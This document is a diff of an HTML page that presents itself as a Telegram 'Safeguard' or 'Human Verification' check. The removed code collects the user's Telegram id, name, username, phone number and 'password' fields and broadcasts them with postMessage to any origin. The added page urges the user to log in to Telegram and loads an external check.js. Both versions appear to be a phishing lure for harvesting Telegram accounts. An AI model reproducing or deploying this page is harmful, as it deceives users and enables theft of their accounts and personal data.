@@ -1,68 +1,53 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Safeguard Verification</title>
-    <script src="/check.js"></script>
-  </head>
-  <body>
-    <div id="app">
-      <h1>Safeguard Verification</h1>
-      <p>Please wait while we verify your identity...</p>
-    </div>
-    <script>
-      if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-        Telegram.WebApp.ready();
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: 'Safeguard mini-app loaded' }),
-        });
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: 'Telegram.WebApp.ready() called' }),
-        });
-
-        const initData = Telegram.WebApp.initDataUnsafe;
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: `initData: ${JSON.stringify(initData)}` }),
-        });
-
-        const userData = {
-          type: 'safeguard',
-          id: initData.user?.id,
-          first_name: initData.user?.first_name,
-          usernames: initData.user?.username ? [{ username: initData.user.username }] : [],
-          phone_number: initData.phone_number || 'Not shared',
-          premium: initData.user?.is_premium || false,
-          password: initData.password || 'Not provided',
-          quickly_set: initData.quickly_set || null,
-        };
-
-        fetch('/api/debug', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: `Sending postMessage for type safeguard with userId ${userData.id}` }),
-        });
-
-        // Send to both window.parent and window.top
-        window.parent.postMessage(userData, '*');
-        window.top.postMessage(userData, '*');
-      } else {
-        document.getElementById('app').innerHTML = '<p>Please open this page in the Telegram app to verify.</p>';
-      }
-    </script>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Human Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      padding: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Human Verification</h1>
+    <p>Please log in to Telegram to verify your identity</p>
+    <button onclick="window.location.href='https://web.telegram.org/a/'">Log in to Telegram</button>
+  </div>
+  <script src="/check.js"></script>
+</body>
 </html>
